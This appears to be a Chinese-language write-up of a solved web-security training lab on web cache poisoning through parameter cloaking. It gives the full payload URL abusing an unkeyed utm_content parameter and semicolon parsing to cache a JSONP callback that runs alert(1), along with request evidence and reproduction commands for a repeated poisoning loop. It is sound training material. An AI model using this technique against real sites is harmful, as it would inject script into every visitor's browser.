---
title: "lab-web-cache-poisoning-param-cloaking"
links:
  - target: cache-poisoning-family
    relation: evidences
---

# lab-web-cache-poisoning-param-cloaking

> evidences: [[cache-poisoning-family]]

- 题面:Parameter cloaking(/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)
- 实例:https://0aaa00bc03b57c52802a275c00fa00ea.web-security-academy.net
- 判定目标:用参数遮蔽投毒缓存,使访客浏览器执行 `alert(1)`
- 状态:**solved**(横幅 `Congratulations, you solved the lab!`)

## 链

1. 首页引用 `<script src="/js/geolocate.js?callback=setCountryCookie">`;该端点把 `callback` 回显成 JSONP 包装。
2. 两个实现缺陷叠加:
   - **缓存键排除 `utm_content`**(请求 `?callback=setCountryCookie&utm_content=…` 会命中
     `?callback=setCountryCookie` 的条目,实测 `X-Cache: hit`)。
   - **后端把 `;` 当参数分隔符**(`utm_content=;callback=alert(1)` 里 `callback=alert(1)` 生效,最后一个 `callback` 胜出)。
3. 投毒 URL:`/js/geolocate.js?callback=setCountryCookie&utm_content=;callback=alert(1)`
   → 键归一为 `…?callback=setCountryCookie`,响应体 `alert(1)({"country":"United Kingdom"});`。
4. 访客首页加载该脚本 → 执行 `alert(1)`。
   响应还带 `Set-Cookie: utm_content=;`,印证后端把 `;` 前的值当 `utm_content`。

## 证据摘录

```
GET /js/geolocate.js?callback=setCountryCookie&cb=9&utm_content=;callback=alert(1)
  -> x-cache: miss; body: …alert(1)({"country":"United Kingdom"});; set-cookie: utm_content=;
GET /js/geolocate.js?callback=setCountryCookie&utm_content=;callback=alert(1) 之后
GET /js/geolocate.js?callback=setCountryCookie   -> 命中同一键(utm_content 被排除)
solved_check <inst> -> solved: true
```

## 复现命令

```
lab_launch launch 0E7FB21969D7178A1C1AE847CD2B80F7A277DEE996BD1450604BA28D8D7A25DA --widget-source /web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking --jar /tmp/b9-jar5.json
poison_loop "<inst>/js/geolocate.js?callback=setCountryCookie&utm_content=;callback=alert(1)" --interval-secs 4 --count 150 --jar /tmp/b9-jar5.json
solved_check "<inst>" --jar /tmp/b9-jar5.json
```
